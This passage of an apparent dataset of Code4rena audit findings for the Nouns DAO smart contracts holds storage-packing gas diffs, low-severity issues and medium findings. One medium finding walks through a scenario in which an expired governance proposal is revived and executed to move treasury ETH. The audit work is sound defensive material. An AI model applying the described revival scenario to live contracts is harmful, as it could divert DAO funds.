b/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol\nindex 0bd594b6..2746e3d6 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol\n@@ -49,21 +49,21 @@ contract NounsAuctionHouseFork is\n\n     // The Nouns ERC721 token contract\n     INounsToken public nouns;\n+    // The duration of a single auction\n+    uint48 public duration;\n\n     // The address of the WETH contract\n     address public weth;\n\n     // The minimum amount of time left in an auction after a new bid is created\n-    uint256 public timeBuffer;\n-\n-    // The minimum price accepted in an auction\n-    uint256 public reservePrice;\n+    uint48 public timeBuffer;\n\n     // The minimum percentage difference between the last bid amount and the current bid\n     uint8 public minBidIncrementPercentage;\n\n-    // The duration of a single auction\n-    uint256 public duration;\n+    // The minimum price accepted in an auction\n+    uint256 public reservePrice;\n+\n\n     // The active auction\n     INounsAuctionHouse.Auction public auction;\n```\n\n### Pack minter with isMinterLocked, descriptor with isDescriptorLocked, seeder with isSeederLocked, escrow with both forkId and forkingPeriodEndTimestamp : From 10 slots to 8 slots (Save 2 SLOTS)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L48-L85\n\n**1 SLOT = 2k Gas**<br>\n **Total gas saved: 4K gas**\n\n*For forkingPeriodEndTimestamp we can reduce the size to uint48 as it should be safe for timestamp*\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n\n49:    address public minter;\n\n52:    INounsDescriptorMinimal public descriptor;\n\n55:    INounsSeeder public seeder;\n\n58:    INounsDAOForkEscrow public escrow;\n\n61:    uint32 public forkId;\n\n64:    uint256 public remainingTokensToClaim;\n\n67:    uint256 public forkingPeriodEndTimestamp;\n\n70:    bool public isMinterLocked;\n\n73:    bool public isDescriptorLocked;\n\n76:    bool public isSeederLocked;\n\n79:    mapping(uint256 => INounsSeeder.Seed) public seeds;\n\n82:    uint256 private _currentNounId;\n\n85:    string private _contractURIHash = 'QmZi1n79FqWt2tTLwCqiy6nLM6xLGRsEPQ5JmReJQKNNzX';\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\nindex a1f9d6d3..ba8947db 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n@@ -48,11 +48,20 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint\n     /// @notice  An address who has permissions to mint Nouns\n     address public minter;\n\n+    /// @notice Whether the minter can be updated\n+    bool public isMinterLocked;\n+\n     /// @notice The Nouns token URI descriptor\n     INounsDescriptorMinimal public descriptor;\n\n+    /// @notice Whether the descriptor can be updated\n+    bool public isDescriptorLocked;\n+\n     /// @notice The Nouns token seeder\n     INounsSeeder public seeder;\n+\n+    /// @notice Whether the seeder can be updated\n+    bool public isSeederLocked;\n\n     /// @notice The escrow contract used to verify ownership of the original Nouns in the post-fork claiming process\n     INounsDAOForkEscrow public escrow;\n@@ -60,20 +69,11 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint\n     /// @notice The fork ID, used when querying the escrow for token ownership\n     uint32 public forkId;\n\n-    /// @notice How many tokens are still available to be claimed by Nouners who put their original Nouns in escrow\n-    uint256 public remainingTokensToClaim;\n-\n     /// @notice The forking period expiration timestamp, after which new tokens cannot be claimed by the original DAO\n-    uint256 public forkingPeriodEndTimestamp;\n+    uint48 public forkingPeriodEndTimestamp;\n\n-    /// @notice Whether the minter can be updated\n-    bool public isMinterLocked;\n-\n-    /// @notice Whether the descriptor can be updated\n-    bool public isDescriptorLocked;\n-\n-    /// @notice Whether the seeder can be updated\n-    bool public isSeederLocked;\n+    /// @notice How many tokens are still available to be claimed by Nouners who put their original Nouns in escrow\n+    uint256 public remainingTokensToClaim;\n\n     /// @notice The noun seeds\n     mapping(uint256 => INounsSeeder.Seed) public seeds;\n```\n\n### Due to how variables are constrained during allocation, their sizes can be reduced to uint48 (Save 4 Slots ) From 10 slots to 6 slots\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L380-L403\n\nGas saved: `4 SLots * 2.1K gas` = 8.4K gas\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\ncontract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {\n382:    address public vetoer;\n\n385:    uint256 public votingDelay;\n\n388:    uint256 public votingPeriod;\n\n391:    uint256 public proposalThresholdBPS;\n\n394:    uint256 public quorumVotesBPS;\n\n397:    uint256 public proposalCount;\n\n400:    INounsDAOExecutor public timelock;\n\n403:    NounsTokenLike public nouns;\n```\n\n**Whenever votingDelay, votingPeriod, proposalThresholdBPS are being assigned a value, we ensure the value has a limit** See below\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L150-L161\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n150:        require(\n151:            votingPeriod_ >= MIN_VOTING_PERIOD && votingPeriod_ <= MAX_VOTING_PERIOD,\n152:            'NounsDAO::initialize: invalid voting period'\n153:        );\n154:        require(\n155:            votingDelay_ >= MIN_VOTING_DELAY && votingDelay_ <= MAX_VOTING_DELAY,\n156:            'NounsDAO::initialize: invalid voting delay'\n157:        );\n158:        require(\n159:            proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,\n160:            'NounsDAO::initialize: invalid proposal threshold bps'\n161:        );\n```\nThe above checks are always made whenever we need to set a value to our storage values. As the checks ensure our values don't exceed a certain number(constant numbers defined) we can inspect the value of the constants and make sure our chosen data type would fit the number.\n\nFor all constants defined in our contracts, for the selected variables here, uint48 would fit without loosing any precision.\n\nWe can therefore pack as follows\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\nindex 8fb0b4d3..3fed7bc2 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\n@@ -382,17 +382,11 @@ contract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {\n     address public vetoer;\n\n     /// @notice The delay before voting on a proposal may take place, once proposed, in blocks\n-    uint256 public votingDelay;\n+    uint48 public votingDelay;\n\n     /// @notice The duration of voting on a proposal, in blocks\n-    uint256 public votingPeriod;\n-\n-    /// @notice The basis point number of votes required in order for a voter to become a proposer. *DIFFERS from GovernerBravo\n-    uint256 public proposalThresholdBPS;\n-\n-    /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo\n-    uint256 public quorumVotesBPS;\n-\n+    uint48 public votingPeriod;\n+\n     /// @notice The total number of proposals\n     uint256 public proposalCount;\n\n@@ -401,6 +395,10 @@ contract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {\n\n     /// @notice The address of the Nouns tokens\n     NounsTokenLike public nouns;\n+        /// @notice The basis point number of votes required in order for a voter to become a proposer. *DIFFERS from GovernerBravo\n+    uint48 public proposalThresholdBPS;\n+    /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo\n+    uint48 public quorumVotesBPS;\n\n     /// @notice The official record of all proposals ever proposed\n     mapping(uint256 => Proposal) internal _proposals;\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20200",
      "title": "[08] Prolonged process due to updatable state",
      "impact": "LOW",
      "content": "The introduction of [`updatePeriodEndBlock`](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L67) in V3 compared to the V1/V2 could unnecessarily prolong the entire proposal voting process.\n\nConsider reducing the pending period to make room for the updatable period which should nonetheless be entailing a longer period still, albeit in a more reasonable sense.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/124#issuecomment-1650660550):**\n > **Reserve price not fully taken care of** -> Low\n> \n> **Code and comment mismatch** -> Non-Critical\n> \n> **Spelling errors** -> Non-Critical\n> \n> **Wrong adoption of block time** -> Non-Critical\n> \n> **`MIN_PROPOSAL_THRESHOLD_BPS` is too low a value** -> Low\n> \n> **V3 upgrade could depreciate token value due to oversupply** -> Non-Critical\n> \n> **Nouns fork may not efficiently remedy a bad situation** -> Non-Critical\n> \n> **Prolonged process due to updatable state** -> Non-Critical\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20199",
      "title": "[07] Nouns fork may not efficiently remedy a bad situation",
      "impact": "LOW",
      "content": "The `20%` threshold, as [documented in the FAQs](https://mirror.xyz/0x10072dfc23771101dC042fD0014f263316a6E400/iN0FKOn_oYVBzlJkwPwK2mhzaeL8K2-W80u82F7fHj8) for instance, `800 * 0.2 = 160` of Nouns tokens, is not a small number comparatively in terms of the market cap. This translates to approximately `160 * 30 ETH * $2,000` almost equivalent to 10 million worth of USDC. For members wishing to dodge bad/undesirable proposals that aren't going to be vetoed, it's likely this will not materialize where the proposals get executed long before the threshold could be met to initiate a fork.\n\nConsider conditionally reducing the threshold given that ragequit (or [quitting](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L196-L245)) is going to happen regardless of the size of the fork. It is the forking group that could share the same goal and direction in a new DAO that matters.        \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20198",
      "title": "[06] V3 upgrade could depreciate token value due to oversupply",
      "impact": "LOW",
      "content": "The forking feature, though rarely happened as [documented in the FAQs](https://mirror.xyz/0x10072dfc23771101dC042fD0014f263316a6E400/iN0FKOn_oYVBzlJkwPwK2mhzaeL8K2-W80u82F7fHj8), could potentially affect the Nouns token value. This is because:\n- a new fork will have its own DAO tokens daily generated and auctioned off through a new Auction House.\n- new Nouns tokens claimed through escrow and during forking period will not have the original Nouns tokens burned. They are transferred to the original treasury or elsewhere as the DAO deems fit.\n\nWith a new fork competing with the original DAO for the daily auction, it will likely diverge the amount of ETH intended to go into bidding for the daily new NFTs at opposing ends. The situation could be worse in the far future if more forks were to transpire.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20197",
      "title": "[05] `MIN_PROPOSAL_THRESHOLD_BPS` is too low a value",
      "impact": "LOW",
      "content": "In NounsDAOLogicV2.sol, NounsDAOV3Admin.sol, and NounsDAOLogicV1Fork.sol, the minimum proposal threshold can be set as low as 1 basis point.\n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L61-L62<br>\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L111-L112<br>\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L118-L119\n\n```solidity\n    /// @notice The minimum setable proposal threshold\n    uint256 public constant MIN_PROPOSAL_THRESHOLD_BPS = 1; // 1 basis point or 0.01%\n```\nThis could pose a precision issue even if the total supply of Nouns tokens is already in its three digits. Apparently, a proposal threshold determined via the following two functions could return zero, e.g. `(1 * 720) / 10000` yields zero due to truncation, i.e. the numerator smaller than the denominator.\n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L921-L923\n\n```solidity\n    function proposalThreshold() public view returns (uint256) {\n        return bps2Uint(proposalThresholdBPS, nouns.totalSupply());\n    }\n```\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L1066-L1068\n\n```solidity\n    function bps2Uint(uint256 bps, uint256 number) internal pure returns (uint256) {\n        return (number * bps) / 10000;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20196",
      "title": "[04] Wrong adoption of block time (V2 Only)",
      "impact": "LOW",
      "content": "The following voting period constants are assuming 9.6 instead of 12 seconds per block. Depending on the sensitivity of lower and upper ranges desired, these may limit or shift the intended settable voting periods. For instance, using the supposed 12 second per block convention, the minimum and maximum settable voting periods should respectively be `7_200` and `100_800`. \n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L67-L71\n\n```solidity\n    /// @notice The minimum setable voting period\n    uint256 public constant MIN_VOTING_PERIOD = 5_760; // About 24 hours\n\n    /// @notice The max setable voting period\n    uint256 public constant MAX_VOTING_PERIOD = 80_640; // About 2 weeks\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20195",
      "title": "[03] Spelling errors",
      "impact": "LOW",
      "content": "There are numerous instances throughout the codebase in different contracts. Here's just one of the specific instances:  \n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L61\n\n```solidity\n    @ audit setable should be changed to settable\n    /// @notice The minimum setable proposal threshold\n```\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L218\n\n```solidity\n            @ audit arity should be changed to parity\n            'NounsDAO::propose: proposal function information arity mismatch'\n```\nThere are numerous instances throughout the codebase in different contracts. Here's just one of the specific instances:  \n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L901\n\n```solidity\n     @ audit priviledges should be changed to privileges\n     * @notice Burns veto priviledges\n```\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L19\n\n```solidity\n@ audit NounsDAOLogicV2.sol should be changed to NounsDAOLogicV3.sol\n// NounsDAOLogicV2.sol is a modified version of Compound Lab's GovernorBravoDelegate.sol:\n```\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L217\n\n```solidity\n    @ audit the during of should be omitted\n    /// @notice Emitted when the during of the forking period is set\n```\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol#L80-L84\n\n```solidity\n    @ audit thats should be changed to that's\n    /// @notice An event thats emitted when an account changes its delegate\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n\n    @ audit thats should be changed to that's\n    /// @notice An event thats emitted when a delegate account's vote balance changes\n    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20194",
      "title": "[02] Code and comment mismatch (V2 Only)",
      "impact": "LOW",
      "content": "https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L86\n\n```solidity\n    @ audit 4,000 should be changed to 6,000\n    uint256 public constant MAX_QUORUM_VOTES_BPS_UPPER_BOUND = 6_000; // 4,000 basis points or 60%\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20193",
      "title": "[01] Reserve price not fully taken care of",
      "impact": "LOW",
      "content": "It is possible for an active auction to close at a price lower than the newly increased reserve price. This is undesirable especially when preventing a Noun auctioned off at the lower than expected price could be out of control in a bear market. Consider adding a check alleging that the contract balance needing to exceed the reserve price. Else, the last bidder will be refunded prior to having the Noun burned. Here's a refactored code logic that will take care of the suggestion.\n\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L236-L256\n\n```solidity\n/**\n * @notice Settle an auction, finalizing the bid and paying out to the owner.\n * @dev If there are no bids, the Noun is burned.\n */\nfunction _settleAuction() internal {\n    INounsAuctionHouse.Auction memory _auction = auction;\n\n    require(_auction.startTime != 0, \"Auction hasn't begun\");\n    require(!_auction.settled, 'Auction has already been settled');\n    require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\");\n\n    auction.settled = true;\n\n    // Check if contract balance is greater than reserve price\n    if (address(this).balance < reservePrice) {\n        // If contract balance is less than reserve price, refund to the last bidder\n        if (_auction.bidder != address(0)) {\n            _safeTransferETHWithFallback(_auction.bidder, _auction.amount);\n        }\n\n        // And then burn the Noun\n        nouns.burn(_auction.nounId);\n    } else {\n        if (_auction.bidder == address(0)) {\n            nouns.burn(_auction.nounId);\n        } else {\n            nouns.transferFrom(address(this), _auction.bidder, _auction.nounId);\n        }\n\n        if (_auction.amount > 0) {\n            _safeTransferETHWithFallback(owner(), _auction.amount);\n        }\n    }\n\n    emit AuctionSettled(_auction.nounId, _auction.bidder, _auction.amount);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20192",
      "title": "[M-03] `NounsDAOV3Proposals.cancel()` should allow to cancel the proposal of the Expired state",
      "impact": "MEDIUM",
      "content": "\ncancel() does not allow to cancel proposals in the final states Canceled/Defeated/Expired/Executed/Vetoed.\n\n```solidity\n    function cancel(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        NounsDAOStorageV3.ProposalState proposalState = stateInternal(ds, proposalId);\n        if (\n            proposalState == NounsDAOStorageV3.ProposalState.Canceled ||\n            proposalState == NounsDAOStorageV3.ProposalState.Defeated ||\n            proposalState == NounsDAOStorageV3.ProposalState.Expired ||\n            proposalState == NounsDAOStorageV3.ProposalState.Executed ||\n            proposalState == NounsDAOStorageV3.ProposalState.Vetoed\n        ) {\n            revert CantCancelProposalAtFinalState();\n        }\n```\n\nThe Canceled/Executed/Vetoed states are final because they cannot be changed once they are set.\n\nThe Defeated state is also a final state because no new votes will be cast (`stateInternal()` may return Defeated only if the `objectionPeriodEndBlock` is passed).\n\nBut the Expired state depends on the `GRACE_PERIOD` of the timelock, and `GRACE_PERIOD` may be changed due to upgrades. Once the `GRACE_PERIOD` of the timelock is changed, the state of the proposal may also be changed, so Expired is not the final state.\n\n```solidity\n        } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n            return NounsDAOStorageV3.ProposalState.Expired;\n        } else {\n            return NounsDAOStorageV3.ProposalState.Queued;\n```\n\nConsider the following scenario:\n\n- Alice submits proposal A to stake 20,000 ETH to a DEFI protocol, and it is successfully passed, but it cannot be executed because there is now only 15,000 ETH in the timelock (consumed by other proposals), and then proposal A expires.\n- The DEFI protocol has been hacked or rug-pulled.\n- Now proposal B is about to be executed to upgrade the timelock and extend `GRACE_PERIOD` (e.g., `GRACE_PERIOD` is extended by 7 days from V1 to V2).\n- Alice wants to cancel Proposal A, but it cannot be canceled because it is in Expired state.\n- Proposal B is executed, causing Proposal A to change from Expired to Queued.\n- The malicious user sends 5000 ETH to the timelock and immediately executes Proposal A to send 20000 ETH to the hacked protocol.\n\n### Proof of Concept\n\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L571-L581>\n\n### Recommended Mitigation Steps\n\nConsider adding a proposal expiration time field in the Proposal structure.\n\n```diff\n    function queue(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        require(\n            stateInternal(ds, proposalId) == NounsDAOStorageV3.ProposalState.Succeeded,\n            'NounsDAO::queue: proposal can only be queued if it is succeeded'\n        );\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);\n        uint256 eta = block.timestamp + timelock.delay();\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            queueOrRevertInternal(\n                timelock,\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                eta\n            );\n        }\n        proposal.eta = eta;\n+       proposal.exp = eta + timelock.GRACE_PERIOD();\n...\n-       } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n+       } else if (block.timestamp >= proposal.exp) {\n            return NounsDAOStorageV3.ProposalState.Expired;\n```\n\n**[eladmallel (Nouns DAO) acknowledged and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1644570812):**\n > Agree, it's possible due to a change in executor's grace period to move from Expired back to Queued.<br>\n> However, since a grace period change is a rare event, we think this is very low priority and we won't fix.\n\n**[gzeon (judge) decreased severity to Low/Non-Critical](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650646474)**\n\n**[eladmallel (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650607865):**\n > We think it would be great to include this issue in the report (at medium severity).\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650646474):**\n > @eladmallel - Changing the `GRACE_PERIOD` is an admin change, which besides misconfiguration is out-of-scope, it is as you described is a rare event. Having a malicious proposal which is passed that got expired is also a rare event. Having a changed `GRACE_PERIOD` that just long enough to make such a malicious proposal become queued is a very rare event, assuming governance is not completely compromised already.\n> \n> That said, I am ok with this being Medium risk since this is clearly in scope + can be Medium risk with some assumption (tho extreme imo but is subjective), and I would recommend for a fix accordingly. Please let me know if that's what you want, thanks!\n\n**[eladmallel (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650792548):**\n > Thank you @gzeon.<br>\n> We all agree the odds of the risk materializing is low, we just felt like this was a nice find, and honestly mostly motivated by wanting the warden who found this to have a win :)\n> \n> It's not a deal breaker for us if it's in the report or not, just wanted to express our preference.\n> \n> Thank you for sharing more of your thinking, it's helpful!\n\n**[cccz (warden) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1650936160):**\n > Low Likelihood + High Severity is generally considered Medium, which is an edge case that fits the medium risk.<br>\n> Another thing I would say is that the proposal doesn't need to be malicious, as I said in the attack scenario where the proposal is normal but expires due to inability to execute for other reasons ( contract balance insufficient, etc.).\n> > *Changing the `GRACE_PERIOD` is an admin change, which besides misconfiguration is out-of-scope, it is as you described is a rare event. Having a malicious proposal which is passed that got expired is also a rare event. Having a changed `GRACE_PERIOD` that just long enough to make such a malicious proposal become queued is a very rare event, assuming governance is not completely compromised already.*\n\n**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55#issuecomment-1651037458):**\n > @cccz - True, but this is also marginally out-of-scope since an admin action is required, and one may argue it is a misconfiguration if you increase `GRACE_PERIOD` so much that it revive some old passed buggy proposal. \n> \n> But given this is marginal and on sponsor's recommendation, I will upgrade this to Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the cancel() function in the NounsDAOV3Proposals smart contract. The cancel() function does not allow proposals in the final states Canceled/Defeated/Expired/Executed/Vetoed to be cancelled. The Canceled/Executed/Vetoed states are final because they cannot be changed once they are set, while the Defeated state is also final because no new votes will be cast. The Expired state is not final, however, as the `GRACE_PERIOD` of the timelock may be changed due to upgrades, which can cause the state of the proposal to be changed.\n\nTo demonstrate the problem, consider the following scenario: Alice submits a proposal to stake 20,000 ETH to a DEFI protocol, and it is successfully passed, but it cannot be executed because there is now only 15,000 ETH in the timelock (consumed by other proposals). The proposal then expires, and a malicious user sends 5000 ETH to the timelock and immediately executes the proposal to send 20000 ETH to the hacked protocol.\n\nThe recommended mitigation steps include adding a proposal expiration time field in the Proposal structure. This would help to prevent malicious proposals from being executed. The risk of this issue is considered to be medium, as the likelihood of the risk materializing is low but the severity is high.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/55",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "20191",
      "title": "[M-02] If DAO updates `forkEscrow` before `forkThreshold` is reached, the user's escrowed Nouns will be lost",
      "impact": "MEDIUM",
      "content": "\nDuring the escrow period, users can escrow to or withdraw from forkEscrow their Nouns.\n\nDuring the escrow period, proposals can be executed.\n\n```solidity\n    function withdrawFromForkEscrow(NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds) external {\n        if (isForkPeriodActive(ds)) revert ForkPeriodActive();\n\n        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;\n        forkEscrow.returnTokensToOwner(msg.sender, tokenIds);\n\n        emit WithdrawFromForkEscrow(forkEscrow.forkId(), msg.sender, tokenIds);\n    }\n```\n\nSince withdrawFromForkEscrow will only call the returnTokensToOwner function of ds.forkEscrow, and returnTokensToOwner is only allowed to be called by DAO.\n\nIf, during the escrow period, ds.forkEscrow is changed by the proposal's call to \\_setForkEscrow, then the user's escrowed Nouns will not be withdrawn by withdrawFromForkEscrow.\n\n```solidity\n    function returnTokensToOwner(address owner, uint256[] calldata tokenIds) external onlyDAO {\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            if (currentOwnerOf(tokenIds[i]) != owner) revert NotOwner();\n\n            nounsToken.transferFrom(address(this), owner, tokenIds[i]);\n            escrowedTokensByForkId[forkId][tokenIds[i]] = address(0);\n        }\n\n        numTokensInEscrow -= tokenIds.length;\n    }\n```\n\nConsider that some Nouners is voting on a proposal that would change ds.forkEscrow.<br>\nThere are some escrowed Nouns in forkEscrow (some Nouners may choose to always escrow their Nouns to avoid missing fork).<br>\nThe proposal is executed, ds.forkEscrow is updated, and the escrowed Nouns cannot be withdrawn.\n\n### Proof of Concept\n\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol#L95-L102><br>\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOForkEscrow.sol#L116-L125><br>\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L527-L531>\n\n### Recommended Mitigation Steps\n\nConsider allowing the user to call forkEscrow\\.returnTokensToOwner directly to withdraw escrowed Nouns, and need to move 